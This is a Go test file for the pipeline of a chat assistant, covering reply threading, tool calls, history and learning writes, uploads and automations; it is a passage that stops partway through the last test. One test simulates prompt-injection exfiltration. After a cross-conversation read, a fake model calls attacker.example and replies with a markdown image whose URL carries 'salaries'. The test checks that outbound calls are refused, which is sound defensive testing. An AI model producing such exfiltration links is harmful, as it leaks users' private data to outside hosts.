package pipeline_test

import (
	"cmp"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"maps"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"
	"testing/synctest"
	"time"

	"github.com/sarpaydemir/dost/internal/automation"
	"github.com/sarpaydemir/dost/internal/clock"
	"github.com/sarpaydemir/dost/internal/config"
	"github.com/sarpaydemir/dost/internal/kb"
	"github.com/sarpaydemir/dost/internal/llm"
	"github.com/sarpaydemir/dost/internal/pipeline"
	"github.com/sarpaydemir/dost/internal/port/chat"
	"github.com/sarpaydemir/dost/internal/port/model"
	"github.com/sarpaydemir/dost/internal/port/tool"
	"github.com/sarpaydemir/dost/internal/port/web"
	"github.com/sarpaydemir/dost/internal/prompt"
	"github.com/sarpaydemir/dost/internal/routing"
	"github.com/sarpaydemir/dost/internal/testkit"
	"github.com/sarpaydemir/dost/internal/testkit/kvtest"
	"github.com/sarpaydemir/dost/internal/textfmt"
)

const agentID = "agent"

// chatFake is a chat platform whose payloads are JSON-encoded messages. Send records each post; failures makes
// the next posts fail with failure, or a server error when it is nil, and hold, when set, keeps each post waiting
// until it is closed. With selfWaits, asking for the agent's account waits until the request is cancelled.
type chatFake struct {
	identity  chat.User
	failures  int
	failure   error
	hold      chan struct{}
	selfWaits bool

	mu      sync.Mutex
	posts   []chat.Outgoing
	uploads []string
}

func payload(m chat.Message) json.RawMessage {
	b, _ := json.Marshal(m)
	return b
}

func (*chatFake) Decode(event json.RawMessage) (chat.Message, bool) {
	var m chat.Message
	if json.Unmarshal(event, &m) != nil || m.ID == "" {
		return chat.Message{}, false
	}
	m.Payload = event
	return m, true
}

func (c *chatFake) Identity() chat.User { return c.identity }

func (c *chatFake) Self(ctx context.Context) (chat.User, error) {
	if c.selfWaits {
		<-ctx.Done()
		return chat.User{}, ctx.Err()
	}
	return c.identity, nil
}

func (*chatFake) User(_ context.Context, id string) (chat.User, error) {
	return chat.User{ID: id, Username: id}, nil
}

func (c *chatFake) Send(_ context.Context, m chat.Outgoing) (string, error) {
	if c.hold != nil {
		<-c.hold
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	c.posts = append(c.posts, m)
	if c.failures > 0 {
		c.failures--
		return "", cmp.Or(c.failure, errors.New("mattermost POST /posts: 500 Internal Server Error"))
	}
	return fmt.Sprintf("reply%d", len(c.posts)), nil
}

func (c *chatFake) sent() []chat.Outgoing {
	c.mu.Lock()
	defer c.mu.Unlock()
	return slices.Clone(c.posts)
}

func (*chatFake) Listen(context.Context, func(), chat.Deliver) error { return errors.ErrUnsupported }

func (*chatFake) Replay(context.Context, time.Time, chat.Deliver) error { return errors.ErrUnsupported }

// Attachment describes every attachment as a small PNG image.
func (*chatFake) Attachment(context.Context, string) (chat.Attachment, error) {
	return chat.Attachment{Name: "a.png", Extension: "png", MediaType: "image/png", Size: 4}, nil
}

func (*chatFake) Download(context.Context, string, int64) ([]byte, error) {
	return []byte("\x89PNG"), nil
}

func (c *chatFake) Upload(_ context.Context, conversationID string, f chat.File) (string, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.uploads = append(c.uploads, conversationID+"/"+f.Name)
	return fmt.Sprintf("file%d", len(c.uploads)), nil
}

// modelFake answers each chat request that offers tools with the next of toolCalls while any are left, and any
// other with the next of answers, then with "ok". A failing answer is an empty string. When hold is set, each
// request waits for it to close or for the request's cancellation. Image returns image when it has data.
type modelFake struct {
	answers   []string
	toolCalls [][]model.ToolCall
	image     model.Image
	hold      chan struct{}

	mu       sync.Mutex
	requests []model.Request
}

func (f *modelFake) Chat(ctx context.Context, r model.Request) (model.Response, error) {
	f.mu.Lock()
	f.requests = append(f.requests, r)
	if len(r.Tools) > 0 && len(f.toolCalls) > 0 {
		calls := f.toolCalls[0]
		f.toolCalls = f.toolCalls[1:]
		f.mu.Unlock()
		return model.Response{Message: model.Message{Role: model.RoleAssistant, ToolCalls: calls}}, nil
	}
	answer := "ok"
	if len(f.answers) > 0 {
		answer, f.answers = f.answers[0], f.answers[1:]
	}
	f.mu.Unlock()
	if f.hold != nil {
		select {
		case <-f.hold:
		case <-ctx.Done():
			return model.Response{}, ctx.Err()
		}
	}
	if answer == "" {
		return model.Response{}, errors.New("503 Service Unavailable")
	}
	return model.Response{Message: model.Message{Role: model.RoleAssistant, Content: answer}}, nil
}

func (f *modelFake) received() []model.Request {
	f.mu.Lock()
	defer f.mu.Unlock()
	return slices.Clone(f.requests)
}

func (*modelFake) Embed(context.Context, string, string) ([]float32, error) {
	return nil, errors.ErrUnsupported
}

func (f *modelFake) Image(context.Context, string, string) (model.Image, error) {
	if f.image.Data == nil {
		return model.Image{}, errors.ErrUnsupported
	}
	return f.image, nil
}

// lookupTool is a contributed tool that records its calls and returns their arguments, reporting a read of the
// conversation readFrom when it is set. With cancel set, it cancels the run and then asks to write, recording the
// answer in writeErr.
type lookupTool struct {
	mu       sync.Mutex
	calls    []tool.Call
	readFrom string
	cancel   context.CancelFunc
	writeErr error
}

func (*lookupTool) Name() string { return "lookup" }

func (*lookupTool) Parameters() json.RawMessage { return json.RawMessage(`{"type":"object"}`) }

func (l *lookupTool) Call(ctx context.Context, c tool.Call) (string, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.calls = append(l.calls, c)
	if l.readFrom != "" {
		c.ReadFrom(l.readFrom)
	}
	if l.cancel != nil {
		l.cancel()
		l.writeErr = c.BeforeWrite(ctx)
	}
	return "found " + string(c.Args), nil
}

func (l *lookupTool) received() []tool.Call {
	l.mu.Lock()
	defer l.mu.Unlock()
	return slices.Clone(l.calls)
}

// historyFake keeps the user and assistant texts of each key's turns and records every write.
type historyFake struct {
	mu     sync.Mutex
	items  map[string][]json.RawMessage
	writes []string // "<key> <turn>", in write order
	reads  int
}

func (h *historyFake) Get(_ context.Context, key string, n int) ([]json.RawMessage, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.reads++
	return textfmt.Tail(slices.Clone(h.items[key]), n), nil
}

func (h *historyFake) AddTurn(ctx context.Context, key, user, assistant string, metadata map[string]any) (int, error) {
	if err := ctx.Err(); err != nil {
		return 0, err
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	meta, _ := json.Marshal(metadata)
	turn, _ := json.Marshal(map[string]any{"user": user, "assistant": assistant})
	h.items[key] = append(h.items[key], turn)
	h.writes = append(h.writes, key+" "+string(meta)+" "+string(turn))
	return len(h.items[key]), nil
}

func (h *historyFake) Add(_ context.Context, key string, item json.RawMessage) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.items[key] = append(h.items[key], item)
	h.writes = append(h.writes, key+" "+string(item))
	return nil
}

// Scoped serves the last n turns under key; the fake keeps no scopes.
func (h *historyFake) Scoped(ctx context.Context, key, _ string, n int) ([]json.RawMessage, error) {
	return h.Get(ctx, key, n)
}

// user returns the user text of the turns under key.
func (h *historyFake) user(key string) []string {
	h.mu.Lock()
	defer h.mu.Unlock()
	var out []string
	for _, item := range h.items[key] {
		var turn struct{ User string }
		_ = json.Unmarshal(item, &turn)
		out = append(out, turn.User)
	}
	return out
}

func (h *historyFake) written() []string {
	h.mu.Lock()
	defer h.mu.Unlock()
	return slices.Clone(h.writes)
}

// webFake finds nothing and reads empty pages, and records each query and URL.
type webFake struct{ requests []string }

func (w *webFake) Search(_ context.Context, query string, _ int) ([]web.Result, error) {
	w.requests = append(w.requests, query)
	return nil, nil
}

func (w *webFake) Fetch(_ context.Context, url string) (string, error) {
	w.requests = append(w.requests, url)
	return "", nil
}

// settingsFake serves the snapshot s; tests replace it only while no run is going.
type settingsFake struct{ s *config.Settings }

func (f *settingsFake) Current(context.Context) *config.Settings { return f.s }

// fixture is a pipeline on fakes; the agent is "agent" with the username "helper". Its settings offer no tools
// until a test replaces them.
type fixture struct {
	p        *pipeline.Pipeline
	chat     *chatFake
	web      *webFake
	model    *modelFake
	lookup   *lookupTool
	history  *historyFake
	learning *kvtest.Memory
	settings *settingsFake
	catalog  *prompt.Catalog
	logs     *syncBuffer
}

func newFixture(t *testing.T) *fixture {
	entries := append(prompt.Builtin(), prompt.Entry{ID: "tools.desc.lookup", Kind: prompt.KindRaw, Default: "Look up."})
	cat, err := prompt.Load(entries, "")
	if err != nil {
		t.Fatal(err)
	}
	f := &fixture{
		chat:     &chatFake{identity: chat.User{ID: agentID, Username: "helper"}},
		web:      &webFake{},
		model:    &modelFake{},
		lookup:   &lookupTool{},
		history:  &historyFake{items: map[string][]json.RawMessage{}},
		learning: &kvtest.Memory{},
		settings: &settingsFake{s: &config.Settings{Model: "chat-model", EnabledTools: []string{}}},
		catalog:  cat,
		logs:     &syncBuffer{},
	}
	discard := slog.New(slog.DiscardHandler)
	f.p = &pipeline.Pipeline{
		Settings: f.settings,
		Platform: func(*config.Settings) (chat.Platform, error) { return f.chat, nil },
		Model:    func(*config.Settings) (model.Provider, error) { return f.model, nil },
		Search:   func(*config.Settings) (web.Searcher, error) { return f.web, nil },
		Fetch:    func(*config.Settings) (web.Fetcher, error) { return f.web, nil },
		Tools:    func(*config.Settings, *prompt.Catalog) []tool.Tool { return []tool.Tool{f.lookup} },
		Identity: routing.NewIdentity(&kvtest.Memory{}, "agent:bot_identity", clock.Real(), discard),
		History:  f.history,
		Learning: kb.Batch{Store: f.learning, Learn: kb.NewTrigger(), Log: discard},
		Prompts:  cat,
		Zone:     time.UTC,
		Clock:    clock.Real(),
		Log:      slog.New(slog.NewTextHandler(f.logs, &slog.HandlerOptions{Level: slog.LevelDebug})),
	}
	return f
}

// job is the run for messages, buffered under key, with the combined text the flusher builds.
func job(key string, messages ...chat.Message) routing.Job {
	j := routing.Job{Key: key, Generation: "g-" + messages[0].ID, Payload: payload(messages[0])}
	var lines []string
	for _, m := range messages {
		j.MessageIDs = append(j.MessageIDs, m.ID)
		lines = append(lines, m.AuthorID+": "+m.Text)
		j.AttachmentIDs = append(j.AttachmentIDs, m.AttachmentIDs...)
	}
	j.Text = strings.Join(lines, "\n")
	return j
}

func allowWrites(context.Context) error { return nil }

func (f *fixture) answer(t *testing.T, j routing.Job) {
	t.Helper()
	if err := f.p.Answer(t.Context(), j, allowWrites); err != nil {
		t.Fatalf("Answer = %v", err)
	}
}

func TestReplyGoesToTheConversationsThreadAndTheTurnToItsHistories(t *testing.T) {
	cases := []struct {
		name   string
		msg    chat.Message
		thread string
		writes []string
	}{
		{
			"direct message at the conversation root",
			chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct},
			"",
			[]string{`u1 {"context_id":"p1","is_dm":true,"scope":"private","user_id":"u1"} {"assistant":"Hello!","user":"u1: hi"}`},
		},
		{
			"direct message in a thread",
			chat.Message{ID: "p2", ConversationID: "c1", ThreadID: "r1", AuthorID: "u1", Text: "hi", Kind: chat.Direct},
			"",
			[]string{`u1 {"context_id":"r1","is_dm":true,"scope":"private","thread_id":"r1","user_id":"u1"} {"assistant":"Hello!","user":"u1: hi"}`},
		},
		{
			"top-level mention",
			chat.Message{ID: "p3", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: chat.Public},
			"p3",
			[]string{
				`u1 {"context_id":"p3","is_dm":false,"scope":"public","user_id":"u1"} {"assistant":"Hello!","user":"u1: @helper hi"}`,
				`thread:p3 {"context_id":"p3","is_dm":false,"scope":"public","user_id":"u1"} {"assistant":"Hello!","user":"u1: @helper hi"}`,
			},
		},
		{
			"thread reply",
			chat.Message{ID: "p4", ConversationID: "c1", ThreadID: "r1", AuthorID: "u1", Text: "helper what?", Kind: chat.Public},
			"r1",
			[]string{
				`u1 {"context_id":"r1","is_dm":false,"scope":"public","thread_id":"r1","user_id":"u1"} {"assistant":"Hello!","user":"u1: helper what?"}`,
				`thread:r1 {"context_id":"r1","is_dm":false,"scope":"public","thread_id":"r1","user_id":"u1"} {"assistant":"Hello!","user":"u1: helper what?"}`,
			},
		},
		{
			"mention in a private channel",
			chat.Message{ID: "p5", ConversationID: "c1", AuthorID: "u1", Text: "@Helper hi", Kind: chat.Private},
			"p5",
			[]string{
				`u1 {"context_id":"p5","is_dm":false,"scope":"public","user_id":"u1"} {"assistant":"Hello!","user":"u1: @Helper hi"}`,
				`thread:p5 {"context_id":"p5","is_dm":false,"scope":"public","user_id":"u1"} {"assistant":"Hello!","user":"u1: @Helper hi"}`,
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newFixture(t)
			f.model.answers = []string{"Hello!"}
			f.answer(t, job("k", tc.msg))
			want := []chat.Outgoing{{ConversationID: "c1", ThreadID: tc.thread, Text: "Hello!"}}
			if got := f.chat.sent(); !reflect.DeepEqual(got, want) {
				t.Errorf("posted %+v, want %+v", got, want)
			}
			if got := f.history.written(); !slices.Equal(got, tc.writes) {
				t.Errorf("history writes:\n%s\nwant:\n%s", strings.Join(got, "\n"), strings.Join(tc.writes, "\n"))
			}
		})
	}
}

func TestCombinedTextIsAnsweredWithTheSystemPromptAndHistory(t *testing.T) {
	f := newFixture(t)
	f.history.items["u1"] = []json.RawMessage{json.RawMessage(`{"user": "u1: earlier", "assistant": "before"}`)}
	m1 := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "first", Kind: chat.Direct}
	m2 := chat.Message{ID: "p2", ConversationID: "c1", AuthorID: "u1", Text: "second", Kind: chat.Direct}
	f.answer(t, job("dm:u1", m1, m2))
	reqs := f.model.received()
	if len(reqs) != 1 {
		t.Fatalf("model requests = %d, want 1", len(reqs))
	}
	var roles, contents []string
	for _, m := range reqs[0].Messages {
		roles, contents = append(roles, string(m.Role)), append(contents, m.Content)
	}
	if want := []string{"system", "user", "assistant", "user"}; !slices.Equal(roles, want) {
		t.Fatalf("roles = %q, want %q", roles, want)
	}
	if reqs[0].Model != "chat-model" || len(reqs[0].Tools) != 0 {
		t.Errorf("request model %q with %d tools, want chat-model without tools", reqs[0].Model, len(reqs[0].Tools))
	}
	if !strings.Contains(contents[0], f.catalog.Text("system.no_tools")) {
		t.Errorf("system prompt lacks the no-tools text:\n%s", contents[0])
	}
	if want := []string{"u1: earlier", "before", "u1: first\nu1: second"}; !slices.Equal(contents[1:], want) {
		t.Errorf("messages after the system prompt = %q, want %q", contents[1:], want)
	}
	input, reply := f.logs.line("model input"), f.logs.line("model reply")
	if !strings.Contains(input, "level=DEBUG") || !strings.Contains(input, "user_chars=20") || !strings.Contains(input, "history_items=1") {
		t.Errorf("model input log = %q, want the input sizes at debug", input)
	}
	if !strings.Contains(reply, "level=DEBUG") || !strings.Contains(reply, "reply=ok") {
		t.Errorf("model reply log = %q, want the reply at debug", reply)
	}
}

func TestToolsRunForTheMessageAndTheReplyCarriesTheFilesTheyUploaded(t *testing.T) {
	f := newFixture(t)
	f.settings.s = &config.Settings{Model: "chat-model", ImageGenerationModel: "image-model"}
	f.model.image = model.Image{MediaType: "image/png", Data: []byte("\x89PNG")}
	f.model.toolCalls = [][]model.ToolCall{{
		{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{"id": "x"}`)},
		{ID: "call_2", Name: "generate_image", Arguments: json.RawMessage(`{"prompt": "a cat"}`)},
	}}
	f.model.answers = []string{"Here it is."}
	f.answer(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))

	want := []chat.Outgoing{{ConversationID: "c1", Text: "Here it is.", FileIDs: []string{"file1"}}}
	if got := f.chat.sent(); !reflect.DeepEqual(got, want) {
		t.Errorf("posted %+v, want %+v", got, want)
	}
	if got := f.chat.uploads; !slices.Equal(got, []string{"c1/generated_1.png"}) {
		t.Errorf("uploads %q, want the generated image in the conversation", got)
	}
	reqs := f.model.received()
	if len(reqs) != 2 {
		t.Fatalf("model requests = %d, want 2", len(reqs))
	}
	system := reqs[0].Messages[0].Content
	if len(reqs[0].Tools) == 0 || !strings.Contains(system, f.catalog.Text("tools.instructions")) ||
		strings.Contains(system, f.catalog.Text("system.no_tools")) {
		t.Errorf("first request offers %d tools with the system prompt:\n%s\nwant tools and their instructions",
			len(reqs[0].Tools), system)
	}
	var results []string
	for _, m := range reqs[1].Messages {
		if m.Role == model.RoleTool {
			results = append(results, m.ToolCallID+" "+m.Content)
		}
	}
	if want := []string{`call_1 found {"id": "x"}`, "call_2 " + f.catalog.Text("tool.image.attached")}; !slices.Equal(results, want) {
		t.Errorf("tool results %q, want %q", results, want)
	}
	if line := f.logs.line("tool result"); !strings.Contains(line, "level=DEBUG") || !strings.Contains(line, "tool=lookup") {
		t.Errorf("tool result log = %q, want the lookup result at debug", line)
	}
}

func TestToolCallsAreDirectOnlyInOneToOneConversations(t *testing.T) {
	for kind, direct := range map[chat.Kind]bool{chat.Direct: true, chat.Private: false, chat.Public: false} {
		f := newFixture(t)
		f.settings.s = &config.Settings{Model: "chat-model"}
		f.model.toolCalls = [][]model.ToolCall{{{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{}`)}}}
		f.answer(t, job("k", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: kind}))
		calls := f.lookup.received()
		if len(calls) != 1 || calls[0].ConversationID != "c1" || calls[0].UserID != "u1" || calls[0].Direct != direct {
			t.Errorf("kind %d: calls %+v, want one in c1 for u1 with Direct %t", kind, calls, direct)
		}
	}
}

func TestToolCallsNameTheAuthorAsThePlatformKnowsThem(t *testing.T) {
	f := newFixture(t)
	f.settings.s = &config.Settings{Model: "chat-model"}
	f.model.toolCalls = [][]model.ToolCall{{{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{}`)}}}
	f.answer(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
	calls := f.lookup.received()
	if len(calls) != 1 || calls[0].Requester(t.Context()) != "u1 (@u1)" {
		t.Errorf("calls %+v, want one whose requester is the author's label", calls)
	}
}

func TestReplyThatReadAnotherConversationSendsNothingOutUnlessUnrestricted(t *testing.T) {
	for _, restrict := range []bool{true, false} {
		f := newFixture(t)
		refused := "call_2 " + f.catalog.Text("tool.outbound.refused")
		f.settings.s = &config.Settings{Model: "chat-model", RestrictOutboundAfterCrossReads: restrict,
			KBBatchKey: "agent:public_kb_batch", AssistantLabel: "agent"}
		f.lookup.readFrom = "c2"
		f.model.toolCalls = [][]model.ToolCall{
			{{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{}`)}},
			{{ID: "call_2", Name: "search_web", Arguments: json.RawMessage(`{"query": "planted"}`)},
				{ID: "call_3", Name: "visit_page", Arguments: json.RawMessage(`{"url": "https://attacker.example/"}`)}},
		}
		planted := "Done ![status](https://attacker.example/s.png?d=salaries)"
		f.model.answers = []string{planted}
		f.answer(t, job("thread:p1:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: chat.Public}))
		reqs := f.model.received()
		var results []string
		for _, m := range reqs[len(reqs)-1].Messages {
			if m.Role == model.RoleTool && m.ToolCallID == "call_2" {
				results = append(results, m.ToolCallID+" "+m.Content)
			}
		}
		if restrict && (len(f.web.requests) != 0 || !slices.Equal(results, []string{refused})) {
			t.Errorf("restricted: web requests %q and results %q, want none and the refusal", f.web.requests, results)
		}
		if !restrict && !slices.Equal(f.web.requests, []string{"planted", "https://attacker.example/"}) {
			t.Errorf("unrestricted: web requests %q, want the search and the page", f.web.requests)
		}
		want := map[bool]string{true: "```\n" + planted + "\n```", false: planted}[restrict]
		if posts := f.chat.sent(); len(posts) != 1 || posts[0].Text != want {
			t.Errorf("restrict=%t: posted %+v, want %q", restrict, posts, want)
		}
		saved, _ := json.Marshal(want)
		for _, w := range f.history.written() {
			if !strings.Contains(w, `"assistant":`+string(saved)) {
				t.Errorf("restrict=%t: history write %s, want the reply as posted", restrict, w)
			}
		}
		raw, _, _ := f.learning.Get(t.Context(), "agent:public_kb_batch")
		var batch struct{ Messages []struct{ Message string } }
		_ = json.Unmarshal(raw, &batch)
		if len(batch.Messages) != 1 || batch.Messages[0].Message != "u1: @helper hi\nagent: "+want {
			t.Errorf("restrict=%t: learning batch = %s, want the reply as posted", restrict, raw)
		}
	}
}

func TestToolOfARunCancelledBeforeItsFirstWriteMayNotWrite(t *testing.T) {
	f := newFixture(t)
	f.settings.s = &config.Settings{Model: "chat-model"}
	f.model.toolCalls = [][]model.ToolCall{{{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{}`)}}}
	ctx, cancel := context.WithCancel(t.Context())
	f.lookup.cancel = cancel
	released := 0
	err := f.p.Answer(ctx, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}),
		func(context.Context) error { released++; return nil })
	if !errors.Is(err, context.Canceled) || !errors.Is(f.lookup.writeErr, context.Canceled) {
		t.Errorf("Answer = %v and the tool's write = %v, want both cancelled", err, f.lookup.writeErr)
	}
	if released != 0 || len(f.chat.sent()) != 0 {
		t.Errorf("record released %d times and %d posts, want the record kept and nothing posted", released, len(f.chat.sent()))
	}
}

func TestFactsAreExtractedAfterEveryFifthTurnUnderTheAuthorsKey(t *testing.T) {
	earlier := json.RawMessage(`{"user": "u1: earlier", "assistant": "before"}`)
	cases := []struct {
		name         string
		user, thread int // turns stored before the run under the author's key and under the thread's
		extracts     bool
	}{
		{"author's fifth turn", 4, 0, true},
		{"thread's fifth turn", 3, 4, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newFixture(t)
			f.settings.s = &config.Settings{Model: "chat-model", FactModel: "fact-model", EmbeddingModel: "embed-model"}
			f.history.items["u1"] = slices.Repeat([]json.RawMessage{earlier}, tc.user)
			f.history.items["thread:p3"] = slices.Repeat([]json.RawMessage{earlier}, tc.thread)
			f.model.answers = []string{"NULL", "Hello!", "NULL"} // knowledge query, reply, facts

			f.answer(t, job("k", chat.Message{ID: "p3", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: chat.Public}))

			var asked []string
			for _, r := range f.model.received() {
				if r.Model == "fact-model" && r.Messages[0].Content == f.catalog.Text("memory.facts") {
					asked = append(asked, r.Messages[1].Content)
				}
			}
			if !tc.extracts {
				if len(asked) != 0 {
					t.Errorf("facts extracted from %q, want no extraction", asked)
				}
				return
			}
			if len(asked) != 1 || !strings.HasSuffix(asked[0], "User: u1: @helper hi\nAssistant: Hello!") {
				t.Errorf("facts extracted from %q, want one extraction ending with the saved turn", asked)
			}
		})
	}
}

func TestGateIsAppliedAgainWithTheRunsSettings(t *testing.T) {
	f := newFixture(t)
	// Buffered while c1 was an excluded conversation, which is always answered.
	m := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "no mention", Kind: chat.Public}
	f.answer(t, job("thread:p1:u1", m))
	if got := len(f.model.received()) + len(f.chat.sent()) + len(f.history.written()); got != 0 {
		t.Errorf("a message the gate closes on was answered: %d model requests, posts, and turns", got)
	}

	f.settings.s = &config.Settings{Model: "chat-model", NameExcludedChannels: config.Channels{IDs: []string{"c1"}}}
	f.answer(t, job("thread:p1:u1", m))
	if got := len(f.chat.sent()); got != 1 {
		t.Errorf("posts in an excluded conversation = %d, want 1", got)
	}
}

func TestFailureReplyIsPostedAndSaved(t *testing.T) {
	f := newFixture(t)
	f.model.answers = []string{""}
	f.answer(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
	failure := f.catalog.Text("error.generic") + " [ERR_LLM_INVOKE_FAILED_INITIAL]"
	if got := f.chat.sent(); len(got) != 1 || got[0].Text != failure {
		t.Errorf("posted %+v, want the failure reply %q", got, failure)
	}
	want := []string{`u1 {"context_id":"p1","is_dm":true,"scope":"private","user_id":"u1"} {"assistant":"` + failure + `","user":"u1: hi"}`}
	if got := f.history.written(); !slices.Equal(got, want) {
		t.Errorf("history writes %q, want %q", got, want)
	}
}

func TestTurnIsSavedWhenThePostFails(t *testing.T) {
	f := newFixture(t)
	f.chat.failures = 1
	f.answer(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
	if got := len(f.chat.sent()); got != 1 {
		t.Errorf("post attempts = %d, want 1", got)
	}
	if got := len(f.history.written()); got != 1 {
		t.Errorf("turns saved = %d, want 1", got)
	}
	if line := f.logs.line("reply not posted"); !strings.Contains(line, "level=ERROR") || !strings.Contains(line, "500") {
		t.Errorf("failed post log = %q, want an error with the status", line)
	}
}

func TestAnsweredTurnIsQueuedForLearning(t *testing.T) {
	f := newFixture(t)
	f.settings.s = &config.Settings{Model: "chat-model", KBBatchKey: "agent:public_kb_batch", AssistantLabel: "agent"}
	f.model.answers = []string{"Hello!"}
	m1 := chat.Message{ID: "p1", ConversationID: "c1", ThreadID: "r1", AuthorID: "u1", Text: "helper first",
		Created: time.UnixMilli(1780000000123), Kind: chat.Public}
	m2 := chat.Message{ID: "p2", ConversationID: "c1", ThreadID: "r1", AuthorID: "u1", Text: "second", Kind: chat.Public}
	f.answer(t, job("thread:r1:u1", m1, m2))
	got, _, err := f.learning.Get(t.Context(), "agent:public_kb_batch")
	if err != nil {
		t.Fatal(err)
	}
	want := `{"messages": [{"post_id": "p1", "channel_id": "c1", "user_id": "u1", "create_at": 1780000000123,
		"context_id": "r1", "root_id": "r1", "is_thread": true, "message": "u1: helper first\nu1: second\nagent: Hello!",
		"status": "pending"}]}`
	if eq, err := testkit.JSONEqual(got, []byte(want)); err != nil || !eq {
		t.Errorf("batch = %s\nwant    %s (err %v)", got, want, err)
	}
}

func TestSavedTurnAddsTheAttachmentSummaryAndTheFileContextClippedTo8000Characters(t *testing.T) {
	f := newFixture(t)
	f.settings.s = &config.Settings{Model: "chat-model", VisionModel: "eye", FileMaxCount: 5, FileMaxBytes: 1 << 20}
	analysis := strings.Repeat("é", 8005)
	f.model.answers = []string{analysis, "Nice picture."}
	m1 := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "look", Kind: chat.Direct}
	m2 := chat.Message{ID: "p2", ConversationID: "c1", AuthorID: "u1", Text: "this", AttachmentIDs: []string{"f1"}, Kind: chat.Direct}
	f.answer(t, job("dm:u1", m1, m2))

	fileCtx := textfmt.Strip(f.catalog.Render("files.section", map[string]string{"filename": "a.png", "analysis": analysis}))
	want := "u1: look\nu1: this" +
		f.catalog.Render("memory.files_marker", map[string]string{"file_summary": "a.png (png)"}) +
		f.catalog.Text("memory.file_analysis_marker") + textfmt.Clip(fileCtx, 8000)
	if got := f.history.user("u1"); len(got) != 1 || got[0] != want {
		t.Errorf("saved user texts (%d) differ from the combined text, summary, and clipped analysis", len(got))
	}
}

func TestReplyWithFilesIsPostedAgainWithoutThemWhenThePostFailsButNotAfterATimeout(t *testing.T) {
	msg := chat.Outgoing{ConversationID: "c1", Text: "Here it is", FileIDs: []string{"g1"}}
	cases := []struct {
		name    string
		failure error
		want    []chat.Outgoing
	}{
		{"server error", nil, []chat.Outgoing{msg, {ConversationID: "c1", Text: "Here it is"}}},
		// The server may have created the post before the client gave up.
		{"timeout", fmt.Errorf("mattermost POST /posts: %w", context.DeadlineExceeded), []chat.Outgoing{msg}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := &chatFake{failures: 1, failure: tc.failure}
			if err := pipeline.Send(t.Context(), c, allowWrites, msg, slog.New(slog.DiscardHandler)); err != nil {
				t.Fatal(err)
			}
			if got := c.sent(); !reflect.DeepEqual(got, tc.want) {
				t.Errorf("posted %+v, want %+v", got, tc.want)
			}
		})
	}
}

func TestUploadWaitsForTheRunsPermissionToWrite(t *testing.T) {
	c := &chatFake{}
	refused := errors.New("in-flight record released elsewhere")
	if _, err := pipeline.Upload(t.Context(), c, func(context.Context) error { return refused }, "c1", chat.File{Name: "a.png"}); !errors.Is(err, refused) {
		t.Errorf("refused upload = %v, want %v", err, refused)
	}
	if len(c.uploads) != 0 {
		t.Fatalf("refused upload reached the platform: %q", c.uploads)
	}
	id, err := pipeline.Upload(t.Context(), c, allowWrites, "c1", chat.File{Name: "a.png"})
	if err != nil || id != "file1" || !slices.Equal(c.uploads, []string{"c1/a.png"}) {
		t.Errorf("Upload = %q, %v; platform uploads %q", id, err, c.uploads)
	}
}

// automate configures one automation, "brand", whose handler is h.
func (f *fixture) automate(t *testing.T, h automation.Handler) {
	t.Helper()
	doc := map[string]json.RawMessage{"model": json.RawMessage(`"chat-model"`), "automations": json.RawMessage(
		`[{"name": "brand", "pattern": "/brand\\s+(.+)", "handler": "analyze", "args": {"name": 1}}]`)}
	s, err := config.Load(doc, agentID, nil, func(*config.Settings) error { return nil })
	if err != nil {
		t.Fatal(err)
	}
	f.settings.s = s
	f.p.Handlers = map[string]automation.Handler{"analyze": h}
}

func TestMatchedAutomationPostsThroughTheRunAndOnlyItsReplyIsSaved(t *testing.T) {
	f := newFixture(t)
	var got automation.Run
	f.automate(t, func(ctx context.Context, r automation.Run) (string, error) {
		got = r
		_, err := r.Chat.Send(ctx, chat.Outgoing{ConversationID: r.Message.ConversationID, ThreadID: routing.ReplyThread(r.Message), Text: "Starting."})
		return "Analysis of " + r.Args["name"], err
	})
	writes := 0
	m := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "@helper please /BRAND  Acme Co \nthanks", Kind: chat.Public}
	if err := f.p.Answer(t.Context(), job("thread:p1:u1", m), func(context.Context) error { writes++; return nil }); err != nil {
		t.Fatal(err)
	}
	if got.Message.ID != "p1" || got.Settings != f.settings.s || !maps.Equal(got.Args, map[string]string{"name": "Acme Co"}) {
		t.Errorf("handler got message %q, settings %p, args %q", got.Message.ID, got.Settings, got.Args)
	}
